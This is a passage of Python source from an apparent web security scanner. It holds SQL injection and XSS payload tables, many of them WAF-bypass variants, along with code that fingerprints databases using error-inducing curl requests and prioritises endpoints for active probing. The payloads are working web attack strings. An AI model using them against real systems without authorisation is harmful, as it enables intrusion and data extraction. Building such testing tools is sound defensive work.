        ("' OR 0x31=0x31--", "waf_hex_encode", "Hex-encoded values"),
        ("' OR CHAR(49)=CHAR(49)--", "waf_char_encode", "CHAR function encoding"),
        ("'+OR+1=1--", "waf_plus_space", "Plus sign as space"),
        # Double encoding
        ("'%252f%252a%252a%252fOR%252f%252a%252a%252f1=1--", "waf_double_encode", "Double URL encoding"),
        # Unicode bypass attempts
        ("' OR 1%ef%bc%9d1--", "waf_unicode_equal", "Unicode equals sign"),
        # Null byte injection
        ("'%00OR 1=1--", "waf_null_byte", "Null byte injection"),
        # HTTP Parameter Pollution context
        ("' OR '1'='1", "hpp_context", "HPP-friendly payload"),
    ],
}

SQLI_CROSS_DBMS_FALLBACK_PAYLOADS = [
    ("' OR 1=1-- -", "boolean", "MySQL-style boolean injection"),
    ("' UNION SELECT NULL,@@version,NULL-- -", "version", "MySQL version extraction"),
    ("')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--", "schema_dump", "SQLite schema extraction"),
]


def _payload_pack_cap() -> int:
    """Max payloads pulled from bundled packs per category. Bounded because active
    checks are budget-time-limited: more payloads = fewer endpoints/params covered
    in the same window, so we add pack QUALITY (waf-bypass, polyglots, technique
    packs) not unbounded quantity. Env-overridable; 0 disables packs."""
    try:
        return max(0, int(os.environ.get("SHAKERSCAN_PAYLOAD_PACK_MAX", "24")))
    except (TypeError, ValueError):
        return 24


def _load_custom_payloads(category: str, include_packs: bool = False) -> list[str]:
    """Load extra payloads for a category (additive).

    Sources, merged in priority order:
    1. user drop-in ``payloads/<category>/custom.txt`` and the inline env var
       ``SHAKERSCAN_CUSTOM_<CATEGORY>_PAYLOADS`` (set by the worker from the scan's
       custom_*_payloads option) — always loaded, unbounded.
    2. bundled named packs ``payloads/<category>/*.txt`` (polyglots, waf-bypass,
       auth-bypass, error-based, time-based, ...) — loaded when ``include_packs``,
       capped at ``_payload_pack_cap()`` so curated hardcoded payloads stay primary
       and budget isn't blown. §4/§5: prefer payload packs over hardcoded-only.
    """
    out: list[str] = []
    seen: set[str] = set()

    def _add(line: str) -> bool:
        s = line.strip()
        if s and not s.startswith("#") and s not in seen:
            seen.add(s)
            out.append(s)
            return True
        return False

    pack_dirs = [
        os.path.join(os.path.dirname(__file__), "..", "payloads", category),
        f"/app/payloads/{category}",
    ]
    # 1. custom.txt (user drop-in) — unbounded
    for d in pack_dirs:
        p = os.path.join(d, "custom.txt")
        if os.path.exists(p):
            try:
                with open(p, "r", encoding="utf-8", errors="ignore") as fh:
                    for line in fh:
                        _add(line)
            except OSError:
                pass
    env_raw = os.environ.get(f"SHAKERSCAN_CUSTOM_{category.upper()}_PAYLOADS")
    if env_raw:
        for line in env_raw.splitlines():
            _add(line)
    # 2. bundled named packs — capped
    if include_packs:
        cap = _payload_pack_cap()
        added = 0
        for d in pack_dirs:
            if added >= cap or not os.path.isdir(d):
                continue
            for fname in sorted(os.listdir(d)):
                if added >= cap or not fname.endswith(".txt") or fname == "custom.txt":
                    continue
                try:
                    with open(os.path.join(d, fname), "r", encoding="utf-8", errors="ignore") as fh:
                        for line in fh:
                            if added >= cap:
                                break
                            if _add(line):
                                added += 1
                except OSError:
                    pass
    return out


def _select_sqli_payloads(dbms_key: str | None) -> list[tuple[str, str, str]]:
    selected_key = dbms_key or "generic"
    payloads = list(DBMS_SQLI_PAYLOADS.get(selected_key, DBMS_SQLI_PAYLOADS["generic"]))
    seen = {(payload, technique) for payload, technique, _ in payloads}
    for payload, technique, description in SQLI_CROSS_DBMS_FALLBACK_PAYLOADS:
        if (payload, technique) not in seen:
            payloads.append((payload, technique, description))
            seen.add((payload, technique))
    for custom in _load_custom_payloads("sqli", include_packs=True):
        if (custom, "custom") not in seen:
            payloads.append((custom, "custom", "User-supplied SQLi payload"))
            seen.add((custom, "custom"))
    return payloads

# Context-specific XSS payloads with WAF bypass variants
# Each payload is (payload, technique_name, description)
CONTEXT_XSS_PAYLOADS = {
    "in_script": [
        # Basic payloads
        ("';alert(1)//", "script_break", "Break out of string context"),
        ("</script><script>alert(1)</script>", "script_escape", "Escape script tag"),
        ("-alert(1)-", "template_literal", "Template literal context"),
        ("\\';alert(1)//", "escaped_quote", "Escaped quote bypass"),
        # WAF bypass variants
        ("';alert`1`//", "script_template_literal", "Template literal call"),
        ("';window['ale'+'rt'](1)//", "script_concat", "String concatenation"),
        ("';eval('ale'+'rt(1)')//", "script_eval_concat", "Eval with concat"),
        ("';setTimeout('alert(1)',0)//", "script_settimeout", "setTimeout bypass"),
        ("';Function('alert(1)')()//", "script_function", "Function constructor"),
        ("';[].constructor.constructor('alert(1)')()//", "script_array_proto", "Array prototype chain"),
    ],
    "in_angular": [
        ("{{constructor.constructor('alert(1)')()}}", "ng_sandbox_bypass", "Angular sandbox bypass"),
        ("{{$on.constructor('alert(1)')()}}", "ng_on_bypass", "Angular $on bypass"),
        ("{{7*7}}", "ng_expr_test", "Angular expression test"),
        # Additional Angular/Vue payloads
        ("{{_c.constructor('alert(1)')()}}", "ng_underscore", "Angular _c bypass"),
        ("{{toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)}}", "ng_orderby", "Angular orderBy bypass"),
    ],
    "in_event_handler": [
        ("'-alert(1)-'", "handler_break", "Break handler string"),
        ("javascript:alert(1)", "js_proto", "JavaScript protocol"),
        ("'onclick=alert(1)//", "inject_handler", "Inject new handler"),
        # WAF bypass
        ("'-eval('ale'+'rt(1)')-'", "handler_eval", "Eval in handler"),
        ("'-window['al'+'ert'](1)-'", "handler_window", "Window property access"),
    ],
    "in_attribute": [
        # Basic payloads
        ("' onmouseover=alert(1) x='", "attr_event", "Inject event handler"),
        ('" onfocus=alert(1) autofocus="', "attr_focus", "Auto-focus event"),
        ("'><script>alert(1)</script><'", "attr_escape", "Escape attribute"),
        ("' style='background:url(javascript:alert(1))'", "style_inject", "Style injection"),
        # WAF bypass - HTML entity encoding
        ("' onmouseover=&#97;&#108;&#101;&#114;&#116;(1) x='", "attr_html_entity", "HTML entity encoded"),
        # WAF bypass - case variations
        ("' OnMouseOver=alert(1) x='", "attr_mixed_case", "Mixed case event"),
        ("' ONMOUSEOVER=alert(1) x='", "attr_upper_case", "Upper case event"),
        # Less common event handlers
        ("' onanimationend=alert(1) x='", "attr_animation", "Animation event"),
        ("' ontransitionend=alert(1) x='", "attr_transition", "Transition event"),
        ("' onpointerenter=alert(1) x='", "attr_pointer", "Pointer event"),
    ],
    "in_html": [
        # Basic payloads
        ("<script>alert(1)</script>", "script_tag", "Script tag injection"),
        ("<img src=x onerror=alert(1)>", "img_error", "Image error handler"),
        ("<svg onload=alert(1)>", "svg_load", "SVG onload"),
        ("<body onload=alert(1)>", "body_load", "Body onload"),
        ("<iframe src='javascript:alert(1)'>", "iframe_js", "Iframe JavaScript"),
        ("<details open ontoggle=alert(1)>", "details_toggle", "Details toggle"),
        # WAF bypass - tag variations
        ("<ScRiPt>alert(1)</ScRiPt>", "script_mixed_case", "Mixed case script tag"),
        ("<SCRIPT>alert(1)</SCRIPT>", "script_upper", "Uppercase script tag"),
        ("<svg/onload=alert(1)>", "svg_slash", "SVG with slash"),
        ("<img/src=x/onerror=alert(1)>", "img_slashes", "Image with slashes"),
        ("<img src=x onerror=alert`1`>", "img_backticks", "Image with template literal"),
        # Less common tags with event handlers
        ("<video src=x onerror=alert(1)>", "video_error", "Video error handler"),
        ("<audio src=x onerror=alert(1)>", "audio_error", "Audio error handler"),
        ("<input onfocus=alert(1) autofocus>", "input_autofocus", "Input autofocus"),
        ("<marquee onstart=alert(1)>", "marquee_start", "Marquee onstart"),
        ("<object data='javascript:alert(1)'>", "object_data", "Object data URL"),
        ("<embed src='javascript:alert(1)'>", "embed_src", "Embed src"),
        # Polyglot payloads
        ("jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e", "polyglot", "XSS polyglot"),
    ],
    "in_js_url": [
        ("alert(1)", "direct_call", "Direct function call"),
        ("alert`1`", "template_call", "Template literal call"),
        ("confirm(1)", "confirm_call", "Confirm function"),
        # Additional variants
        ("window['alert'](1)", "window_bracket", "Window bracket notation"),
        ("window.alert(1)", "window_dot", "Window dot notation"),
        ("eval('alert(1)')", "eval_call", "Eval call"),
        ("Function('alert(1)')()", "function_constructor", "Function constructor"),
    ],
    "in_url_path": [
        ("<script>alert(1)</script>", "path_script", "Script in URL path"),
        ("javascript:alert(1)", "path_js_proto", "JavaScript protocol in path"),
        ("%3Cscript%3Ealert(1)%3C/script%3E", "path_url_encoded", "URL-encoded script tag"),
    ],
    "in_css": [
        ("expression(alert(1))", "css_expression", "CSS expression (IE)"),
        ("url('javascript:alert(1)')", "css_url_js", "CSS url with JavaScript"),
        ("</style><script>alert(1)</script>", "css_escape", "Escape style tag"),
    ],
    "in_svg": [
        ("<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>", "svg_xmlns", "SVG with xmlns"),
        ("<svg><animate onbegin=alert(1) attributeName=x dur=1s>", "svg_animate", "SVG animate"),
        ("<svg><set onbegin=alert(1) attributename=x to=x>", "svg_set", "SVG set"),
    ],
    "in_json": [
        # JSON context XSS (when JSON is parsed/eval'd)
        ("</script><script>alert(1)</script>", "json_escape", "Escape JSON context"),
        ('{"x":"</script><script>alert(1)</script>"}', "json_inject", "JSON value injection"),
    ],
}


async def detect_dbms(url: str, param: str | None = None) -> dict:
    """
    Fingerprint the database management system by analyzing error messages.

    Args:
        url: Target URL (optionally with query params)
        param: Specific parameter to test (if None, tests URL as-is)

    Returns:
        Dict with detected DBMS and confidence
    """
    result = {
        "detected": None,
        "confidence": 0.0,
        "evidence": [],
    }

    if _is_sqli_documentation_endpoint(url):
        return result

    def _url_with_payload(value: str) -> str:
        if param:
            parsed = urllib.parse.urlparse(url)
            query_params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            query_params[param] = [value]
            new_query = urllib.parse.urlencode(query_params, doseq=True)
            return urllib.parse.urlunparse(parsed._replace(query=new_query))
        separator = "&" if "?" in url else "?"
        return f"{url}{separator}test={urllib.parse.quote(value)}"

    baseline_body = ""
    baseline_url = _url_with_payload("shakerscan_dbms_baseline")
    baseline_out, _, baseline_rc = await run([
        "curl", "-sS", "-L", "-k", "--max-time", "8",
        "-H", "User-Agent: Mozilla/5.0 (compatible; SecurityScanner/1.0)",
        baseline_url
    ], timeout=10)
    if baseline_rc == 0 and baseline_out:
        baseline_body = baseline_out

    # Error-inducing payloads
    test_payloads = ["'", "''", '"', "\\", "1'1", "1 AND 1=1", "1'"]

    for payload in test_payloads:
        test_url = _url_with_payload(payload)

        out, err, rc = await run([
            "curl", "-sS", "-L", "-k", "--max-time", "8",
            "-H", "User-Agent: Mozilla/5.0 (compatible; SecurityScanner/1.0)",
            test_url
        ], timeout=10)

        if rc == 0 and out:
            fingerprint = _match_dbms_fingerprint(out, baseline_body)
            if fingerprint:
                result["detected"] = fingerprint["dbms"]
                result["confidence"] = 0.9
                result["evidence"].append({
                    "payload": payload,
                    "pattern": fingerprint["pattern"],
                    "match": fingerprint["match"],
                })
                return result

    return result


def detect_reflection_context(response_body: str, marker: str) -> str:
    """
    Determine where input is reflected in the response.

    Args:
        response_body: Full HTTP response body
        marker: The marker/canary string to find

    Returns:
        Context type: "in_script", "in_angular", "in_event_handler",
                     "in_attribute", "in_html", "in_js_url", "in_css", "in_svg",
                     "in_url_path", "in_json", "not_reflected"
    """
    if marker not in response_body:
        return "not_reflected"

    idx = response_body.find(marker)
    before = response_body[max(0, idx - 150):idx]
    after = response_body[idx:idx + len(marker) + 100]

    # Check context patterns (order matters - more specific first)

    # Script context (inside <script> tags)
    if re.search(r'<script[^>]*>[^<]*$', before, re.I | re.S):
        return "in_script"

    # Angular/Vue template expressions
    if re.search(r'{{[^}]*$', before):
        return "in_angular"

    # Event handler attributes (onclick, onmouseover, etc.)
    if re.search(r"on\w+\s*=\s*['\"]?[^'\"]*$", before, re.I):
        return "in_event_handler"

    # SVG context (inside <svg> elements - check if inside unclosed svg tag)
    # Look for <svg that's not followed by </svg> before the marker
    if re.search(r'<svg[^>]*>', before, re.I) and not re.search(r'</svg>', before, re.I):
        return "in_svg"
    if re.search(r'<svg[^>]*$', before, re.I):
        return "in_svg"

    # JSON context (inside JSON object/array)
    # Check for patterns like {"key": " or ["value",
    if re.search(r'["\']:\s*["\']?$', before) or re.search(r'\[\s*["\']?$', before):
        # Verify it looks like JSON structure
        if re.search(r'^\s*[\[{]', response_body[:100]) or 'application/json' in response_body[:500].lower():
            return "in_json"

    # CSS/Style context (inside <style> tags or style attributes)
    if re.search(r'<style[^>]*>[^<]*$', before, re.I | re.S):
        return "in_css"
    if re.search(r'style\s*=\s*["\'][^"\']*$', before, re.I):
        return "in_css"

    # URL path context (in href/src attributes pointing to paths)
    if re.search(r'(href|src|action)\s*=\s*["\']?/[^"\']*$', before, re.I):
        return "in_url_path"

    # JavaScript URL context (href="javascript:..." or similar)
    # Check if we're inside a javascript: URL scheme
    if re.search(r'(href|src|action)\s*=\s*["\']?javascript:[^"\']*$', before, re.I):
        return "in_js_url"

    # Generic attribute context
    if re.search(r"<\w+[^>]+\w+\s*=\s*['\"]?$", before, re.I):
        return "in_attribute"
    if re.search(r"href\s*=\s*['\"]?$", before, re.I):
        return "in_attribute"

    return "in_html"


def _stringify_body_value(value: Any) -> str:
    if isinstance(value, (dict, list)):
        return json.dumps(value)
    if isinstance(value, bool):
        return "true" if value else "false"
    return str(value)


def _coerce_body_values(body: dict[str, Any]) -> dict[str, str]:
    return {key: _stringify_body_value(value) for key, value in body.items()}


def _encode_body_string(body: Any, content_type: str) -> str:
    if "application/json" in content_type:
        return json.dumps(body)
    if "application/x-www-form-urlencoded" in content_type:
        return urllib.parse.urlencode(_coerce_body_values(body))
    if "multipart/form-data" in content_type:
        return urllib.parse.urlencode(_coerce_body_values(body))
    return json.dumps(body)


def _headers_from_curl_args(args: list[str]) -> dict[str, str]:
    """Extract headers from curl arg list."""
    headers: dict[str, str] = {}
    i = 0
    while i < len(args) - 1:
        if args[i] == "-H":
            name, _, value = args[i + 1].partition(":")
            name = name.strip()
            value = value.strip()
            if name:
                headers[name] = value
            i += 2
            continue
        i += 1
    return headers


def _build_curl_body_args(body: Any, content_type: str) -> tuple[list[str], list[str]]:
    if "multipart/form-data" in content_type:
        form_args = []
        if isinstance(body, dict):
            for key, value in body.items():
                form_args.extend(["-F", f"{key}={_stringify_body_value(value)}"])
        return form_args, []
    data = _encode_body_string(body, content_type)
    return ["-d", data], ["-H", f"Content-Type: {content_type}"]


def _filter_curl_headers(args: list[str], drop_names: set[str]) -> list[str]:
    filtered: list[str] = []
    i = 0
    while i < len(args):
        if args[i] == "-H" and i + 1 < len(args):
            header_line = args[i + 1]
            name = header_line.split(":", 1)[0].strip().lower()
            if name in drop_names:
                i += 2
                continue
        filtered.append(args[i])
        if i + 1 < len(args) and args[i] == "-H":
            filtered.append(args[i + 1])
            i += 2
        else:
            i += 1
    return filtered


def _fallback_value_for_param(param: str) -> Any:
    """Generate sane fallback values for parameters based on naming conventions."""
    param_l = param.lower()

    # Numeric IDs
    if param_l.endswith("id") or param_l in ("id", "uid", "user_id", "account_id", "pk", "key"):
        return 1
    if param_l in ("count", "limit", "page", "offset", "size", "per_page", "page_size"):
        return 1

    # Email and credentials
    if "email" in param_l:
        return "test@example.com"
    if "password" in param_l or "passwd" in param_l:
        return "TestPass123!"
    if param_l in ("username", "user", "login", "name", "uname"):
        return "testuser"

    # Codes and tokens
    if any(s in param_l for s in ("code", "coupon", "promo", "voucher", "discount")):
        return "TEST123"
    if "token" in param_l or "apikey" in param_l or "api_key" in param_l:
        return "test_token_abc123"

    # UUIDs
    if "uuid" in param_l or "guid" in param_l:
        return "00000000-0000-0000-0000-000000000001"

    # Booleans
    if param_l.startswith("is_") or param_l in ("enabled", "active", "verified", "confirmed"):
        return False

    # Search/filter
    if any(key in param_l for key in ("search", "query", "term", "filter", "q", "keyword")):
        return "test"

    # Dates
    if "date" in param_l or param_l in ("from", "to", "start", "end", "created", "updated"):
        return "2024-01-01"

    # URLs and paths
    if "url" in param_l or "link" in param_l or "redirect" in param_l:
        return "https://example.com"
    if "path" in param_l or "file" in param_l:
        return "/tmp/test"

    # Phone numbers
    if "phone" in param_l or "mobile" in param_l or "tel" in param_l:
        return "1234567890"

    # Amounts and prices
    if any(s in param_l for s in ("amount", "price", "cost", "total", "quantity", "qty")):
        return 1

    # Slugs and names
    if "slug" in param_l:
        return "test-item"

    return "test"


def _get_nested_value(container: dict[str, Any], key: str) -> Any:
    parts = _normalize_nested_key(key)
    cursor: Any = container
    for part in parts:
        if not isinstance(cursor, dict) or part not in cursor:
            return None
        cursor = cursor[part]
    return cursor


def _param_prefers_string(param: str) -> bool:
    fallback = _fallback_value_for_param(param)
    return isinstance(fallback, str)


def _normalize_synthetic_body_placeholders(body: Any, params: list[str]) -> None:
    """Repair synthetic JSON templates that used numeric placeholders.

    Coverage/ASM replay specs used to encode unknown JSON bodies as
    ``{"field": 1}``. That is fine for IDs but breaks common login fields:
    apps often throw before the injected email payload is evaluated because the
    sibling password/user field is a number. Keep observed templates intact
    except for obvious synthetic numeric placeholders on string-like params.
    """
    if isinstance(body, list):
        if not body or not isinstance(body[0], dict):
            return
        target = body[0]
    elif isinstance(body, dict):
        target = body
    else:
        return

    for param in params:
        if not _param_prefers_string(param):
            continue
        current = _get_nested_value(target, param)
        if isinstance(current, bool):
            continue
        if isinstance(current, (int, float)):
            _set_nested_value(target, param, _fallback_value_for_param(param), overwrite=True)


def _path_param_value(param_name: str) -> str:
    """Get appropriate value for a path parameter."""
    param_l = param_name.lower()
    if "id" in param_l or param_l in ("pk", "key"):
        return "1"
    if "uuid" in param_l or "guid" in param_l:
        return "00000000-0000-0000-0000-000000000001"
    if "slug" in param_l or "name" in param_l:
        return "test-item"
    return "1"


def _resolve_path_params(url: str) -> str:
    """Replace path parameters like {id} or :id with appropriate values."""
    # Replace {param_name} style (e.g., /api/users/{id})
    resolved = re.sub(r"\{([^/}]+)\}", lambda m: _path_param_value(m.group(1)), url)
    # Replace :param_name style (e.g., /api/users/:id)
    resolved = re.sub(r"/:([^/?#]+)", lambda m: "/" + _path_param_value(m.group(1)), resolved)
    return resolved


def _normalize_nested_key(key: str) -> list[str]:
    cleaned = key.replace("]", "").replace("[", ".")
    return [part for part in cleaned.split(".") if part]


def _has_nested_key(container: dict[str, Any], key: str) -> bool:
    parts = _normalize_nested_key(key)
    cursor: Any = container
    for part in parts:
        if not isinstance(cursor, dict) or part not in cursor:
            return False
        cursor = cursor[part]
    return True


def _set_nested_value(container: dict[str, Any], key: str, value: Any, overwrite: bool = True) -> None:
    parts = _normalize_nested_key(key)
    if not parts:
        return
    cursor: dict[str, Any] = container
    for part in parts[:-1]:
        if part not in cursor or not isinstance(cursor[part], dict):
            cursor[part] = {}
        cursor = cursor[part]
    if overwrite or parts[-1] not in cursor:
        cursor[parts[-1]] = value


def _descend_synthetic_array(cursor: dict[str, Any], part: str) -> dict[str, Any]:
    """Return the child dict for ``part`` while preserving list-of-object shape.

    A list-of-objects is flattened as the list key *plus* its element keys, so a
    scalar placeholder already present for ``part`` when we descend signals an
    array: reconstruct it as a single-element list rather than a plain dict.
    """
    existing = cursor.get(part)
    if isinstance(existing, list):
        if not existing or not isinstance(existing[0], dict):
            existing[:] = [{}]
        return existing[0]
    if isinstance(existing, dict):
        return existing
    child: dict[str, Any] = {}
    cursor[part] = [child] if existing is not None else child
    return child


def _synthetic_json_template_from_params(params: list[str]) -> dict[str, Any]:
    """Build a synthetic JSON body from flattened param paths, reconstructing
    arrays (list-of-objects) so type-strict endpoints accept the request and
    active probes reach the vulnerable code path."""
    template: dict[str, Any] = {}
    for raw in params:
        parts = _normalize_nested_key(str(raw or ""))
        if not parts:
            continue
        cursor = template
        for part in parts[:-1]:
            cursor = _descend_synthetic_array(cursor, part)
        leaf = parts[-1]
        if isinstance(cursor.get(leaf), (dict, list)):
            continue  # children already populated for this key; don't clobber
        cursor[leaf] = _fallback_value_for_param(str(raw))
    return template


def _build_body_template(endpoint: dict[str, Any], param: str | None = None) -> Any:
    defaults = endpoint.get("body_param_defaults") or {}
    required = endpoint.get("body_required_params") or []
    body_params = endpoint.get("body_params") or []
    content_type = endpoint.get("content_type") or "application/json"
    nested = "json" in content_type.lower()

    template = endpoint.get("body_template")
    if isinstance(template, dict):
        body: Any = copy.deepcopy(template)
    elif isinstance(template, list):
        body = copy.deepcopy(template)
    else:
        body = {}

    target: dict[str, Any] | None = None
    if isinstance(body, list):
        if not body:
            body.append({})
        if isinstance(body[0], dict):
            target = body[0]
    elif isinstance(body, dict):
        target = body

    # Apply default values
    if target is not None:
        for name, value in defaults.items():
            if nested:
                if not _has_nested_key(target, name):
                    _set_nested_value(target, name, value, overwrite=False)
            else:
                target.setdefault(name, value)

    base_params = required if required else body_params
    if target is not None:
        for name in base_params:
            if nested:
                if not _has_nested_key(target, name):
                    _set_nested_value(target, name, _fallback_value_for_param(name), overwrite=False)
            else:
                target.setdefault(name, _fallback_value_for_param(name))

    if param:
        if target is not None:
            if nested:
                if not _has_nested_key(target, param):
                    _set_nested_value(target, param, defaults.get(param, _fallback_value_for_param(param)), overwrite=True)
            else:
                target.setdefault(param, defaults.get(param, _fallback_value_for_param(param)))

    if nested:
        template_params = list(dict.fromkeys([*_coerce_param_names(base_params), *_coerce_param_names(body_params)]))
        _normalize_synthetic_body_placeholders(body, template_params)

    return body


def _apply_body_param(base_body: Any, param: str, value: Any) -> Any:
    """Apply a parameter value to a body template, handling nested keys.

    Args:
        base_body: The body template (dict, list, or None)
        param: Parameter name (supports nested keys like "user.name" or "data[0].id")
        value: Value to set for the parameter

    Returns:
        A copy of the body with the parameter set to the value
    """
    if base_body is None:
        return {param: value}
    if isinstance(base_body, list):
        new_body = copy.deepcopy(base_body)
        if not new_body:
            new_body = [{}] if param != "__item__" else [value]
        if param == "__item__":
            new_body[0] = value
        elif isinstance(new_body[0], dict):
            if "." in param or "[" in param:
                _set_nested_value(new_body[0], param, value, overwrite=True)
            else:
                new_body[0][param] = value
        else:
            # For array-of-primitives (e.g., ["string"]), inject value directly
            new_body[0] = value
        return new_body
    if not isinstance(base_body, dict):
        base_body = {}
    new_body = copy.deepcopy(base_body)
    if "." in param or "[" in param:
        _set_nested_value(new_body, param, value, overwrite=True)
    else:
        new_body[param] = value
    return new_body


_CURL_STATUS_MARKER = "__CURL_STATUS__:"


def _parse_curl_body_status(out: str | None) -> tuple[str, int | None]:
    if not out or _CURL_STATUS_MARKER not in out:
        return out or "", None
    body, status_part = out.rsplit(_CURL_STATUS_MARKER, 1)
    match = re.search(r"\d{3}", status_part)
    status_code = int(match.group(0)) if match else None
    return body, status_code


async def _detect_dbms_post(
    endpoint_url: str,
    param: str,
    content_type: str,
    auth_args: list,
    method: str = "POST",
    base_body: Any | None = None,
) -> dict:
    """Detect DBMS via POST/PUT/PATCH request with error-inducing payload.

    Args:
        endpoint_url: URL to test
        param: Parameter to inject
        content_type: Content-Type header value
        auth_args: Auth curl arguments
        method: HTTP method (POST, PUT, PATCH)
        base_body: Other params to include with benign values
    """
    if _is_sqli_documentation_endpoint(endpoint_url):
        return {"detected": None}

    if isinstance(base_body, list):
        if "json" not in content_type.lower():
            return {"detected": None}
        baseline_body = copy.deepcopy(base_body)
        if not baseline_body:
            baseline_body = [{}] if param != "__item__" else ["shakerscan_dbms_baseline"]
        if isinstance(baseline_body[0], dict):
            baseline_body[0][param] = "shakerscan_dbms_baseline"
        else:
            baseline_body[0] = "shakerscan_dbms_baseline"
    else:
        baseline_body = dict(base_body) if base_body else {}
        baseline_body[param] = "shakerscan_dbms_baseline"

    baseline_body_args, baseline_header_args = _build_curl_body_args(baseline_body, content_type)
    baseline_cmd = [
        "curl", "-sS", "-X", method, "-L", "-k", "--max-time", "10",
        "-H", "User-Agent: Mozilla/5.0 (compatible; SecurityScanner/1.0)",
    ] + baseline_header_args + auth_args + baseline_body_args + [endpoint_url]

    baseline_out, _, baseline_rc = await run(baseline_cmd, timeout=12)
    baseline_text = baseline_out if baseline_rc == 0 and baseline_out else ""

    # Build body with all params (benign values) + injected param
    if isinstance(base_body, list):
        if "json" not in content_type.lower():
            return {"detected": None}
        test_body = copy.deepcopy(base_body)
        if not test_body:
            test_body = [{}] if param != "__item__" else ["1'"]
        if isinstance(test_body[0], dict):
            test_body[0][param] = "1'"
        else:
            test_body[0] = "1'"
    else:
        test_body = dict(base_body) if base_body else {}
        test_body[param] = "1'"

    body_args, header_args = _build_curl_body_args(test_body, content_type)

    cmd = [
        "curl", "-sS", "-X", method, "-L", "-k", "--max-time", "10",
        "-H", "User-Agent: Mozilla/5.0 (compatible; SecurityScanner/1.0)",
    ] + header_args + auth_args + body_args + [endpoint_url]

    out, _, rc = await run(cmd, timeout=12)
    if rc != 0 or not out:
        return {"detected": None}

    fingerprint = _match_dbms_fingerprint(out, baseline_text)
    if fingerprint:
        return {"detected": fingerprint["dbms"]}

    return {"detected": None}


_ACTIVE_HIGH_VALUE_KEYWORDS = (
    "login", "signin", "sign-in", "auth", "session", "password", "passwd",
    "email", "search", "query", "filter", "account", "admin", "token",
    "register", "signup", "user", "order", "coupon", "product", "payment",
)

# Sources from actually-observed traffic/crawl (trustworthy) vs. generated guesses
# (OPTIONS method fan-out, inferred resource×action permutations) which are mostly
# phantom and otherwise dominate the budget.
_ACTIVE_REAL_SOURCES = frozenset({
    "har_discovery", "har_network_capture", "har", "browser_api_capture", "browser",
    "url_crawl", "crawl", "js_bundle_analysis", "js", "manual", "openapi", "swagger",
})


def _active_endpoint_priority(ep: dict[str, Any]) -> tuple:
    """Rank endpoints so real, high-value injection points (observed request bodies,
    login/search) lead the active-test budget instead of synthetic permutations
    (e.g. OPTIONS-derived ``/api/<Model>s/<action>``). Keyword alone is not enough —
    the synthetic generator mimics high-value keywords — so SOURCE leads the sort."""
    path = str(ep.get("url") or "").lower()
    method = str(ep.get("method") or "GET").upper()
    body = ep.get("body_params") or []
    keyword_hits = sum(1 for k in _ACTIVE_HIGH_VALUE_KEYWORDS if k in path)
    has_body = 1 if (method in ("POST", "PUT", "PATCH") and body) else 0
    real_source = 1 if str(ep.get("source") or "").lower() in _ACTIVE_REAL_SOURCES else 0
    score = active_endpoint_score(ep)
    non_low_value = 1 if score >= 8 else 0
    # Real observed source first, then request-body surface, then keyword relevance,
    # then the shared DAST score (source/path/parameter penalties). This keeps the
    # active modules aligned with the upstream worklist scorer while preserving the
    # old guard against parameter-fanout phantoms.
    return (non_low_value, real_source, has_body, keyword_hits, score)


def _prioritize_active_endpoints(endpoints: list) -> list:
    """Stable value-sort of active-test endpoints, highest priority first."""
    return sorted(endpoints, key=_active_endpoint_priority, reverse=True)


async def smart_sqli_test(
    url: str,
    endpoints: list[dict],
    dbms: str | None = None,
    auth_session: Any | None = None,
    max_endpoints: int = 50,
    max_params_per_endpoint: int = 5,
    max_seconds: float | None = None,
    max_findings: int | None = None,
) -> dict:
    """
    SQLi testing with DBMS-aware payload selection.

    Supports both GET query parameters and POST body parameters.
    GET and POST endpoints are processed separately with their own limits
    to ensure POST endpoints aren't skipped.

    Args:
        url: Base URL
        endpoints: List of endpoints with params/body_params to test
        dbms: Pre-detected DBMS (or None to auto-detect)
        auth_session: AuthSession for authenticated requests (optional)
        max_endpoints: Max endpoints to test per method (GET/POST) (default 50, thorough: 100)
        max_params_per_endpoint: Max params to test per endpoint (default 5, thorough: 10)

    Returns:
        Dict with findings and DBMS info
    """
    import random

    results = {
        "findings": [],
        "dbms_detected": dbms,
        "endpoints_tested": 0,
        "params_tested": 0,
        "vulnerabilities_found": 0,
        "get_endpoints_tested": 0,
        "post_endpoints_tested": 0,
        "budget_exhausted": False,
        "budget_exhausted_reason": None,
        "endpoint_attempts": [],
    }
    deadline = time.monotonic() + max_seconds if max_seconds and max_seconds > 0 else None
    budget_logged = False
    progress_started = time.monotonic()
    last_progress_emit = 0.0

    def _emit_sqli_progress(message: str, force: bool = False) -> None:
        nonlocal last_progress_emit
        now = time.monotonic()
        if not force and now - last_progress_emit < 30.0:
            return
        elapsed = now - progress_started
        if max_seconds and max_seconds > 0:
            pct = 91 + int(1 * min(1.0, elapsed / max_seconds))
        else:
            pct = min(92, 91 + int(elapsed // 300))
        _emit_scan_progress(
            "active_sqli",
            pct,
            (
                f"{message}; endpoints={results['endpoints_tested']} "
                f"params={results['params_tested']} findings={results['vulnerabilities_found']}"
            ),
        )
        last_progress_emit = now

    def _budget_exhausted() -> bool:
        nonlocal budget_logged
        if _scanner_cancel_requested():
            results["budget_exhausted"] = True
            results["budget_exhausted_reason"] = "cancelled"
            if not budget_logged:
                print("[sqli] Cancellation requested; stopping SQLi probes", file=sys.stderr)
                _emit_sqli_progress("cancel requested", force=True)
                budget_logged = True
            return True
        if max_findings is not None and results["vulnerabilities_found"] >= max_findings:
            results["budget_exhausted"] = True
            results["budget_exhausted_reason"] = "finding_cap"
            if not budget_logged:
                print(f"[sqli] Finding budget reached ({max_findings}); stopping SQLi probes", file=sys.stderr)
                _emit_sqli_progress("finding budget reached", force=True)
                budget_logged = True
            return True
        if deadline is not None and time.monotonic() >= deadline:
            results["budget_exhausted"] = True
            results["budget_exhausted_reason"] = "time_budget"
            if not budget_logged:
                print("[sqli] Time budget exhausted; stopping SQLi probes", file=sys.stderr)
                _emit_sqli_progress("time budget exhausted", force=True)
                budget_logged = True
            return True
        return False

    auth_args = get_auth_curl_args(auth_session)
    _emit_sqli_progress("starting SQLi probes", force=True)

